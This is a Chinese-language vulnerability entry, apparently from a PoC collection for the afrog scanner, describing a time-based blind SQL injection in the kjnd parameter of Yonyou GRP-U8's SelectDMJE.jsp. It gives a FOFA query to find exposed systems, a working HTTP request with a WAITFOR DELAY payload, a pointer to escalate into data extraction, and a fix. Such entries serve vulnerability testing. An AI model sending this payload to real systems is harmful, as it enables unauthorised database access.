---
fofa: "app=\"用友-GRP-U8\""
source: "afrog-pocs/zan8in"
---

# 用友 GRP-U8 SelectDMJE.jsp SQL注入漏洞

# 漏洞描述

用友 GRP-U8 /u8qx/SelectDMJE.jsp 接口 kjnd 参数存在 SQL 注入漏洞。攻击者可通过时间盲注执行任意 SQL 语句，获取数据库敏感信息。

# 影响版本

用友 GRP-U8

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 未公开 | 未知 |

# 漏洞复现

FOFA：app="用友-GRP-U8"

POC/EXP：

```
GET /u8qx/SelectDMJE.jsp?kjnd=1';WAITFOR DELAY '0:0:10'-- HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Connection: close
```

若响应延迟约 10 秒，则存在时间盲注；可进一步构造 MSSQL 报错/联合注入语句提取数据。

# 漏洞修复

联系用友官方获取安全补丁，对 kjnd 参数使用预编译语句并做严格过滤。
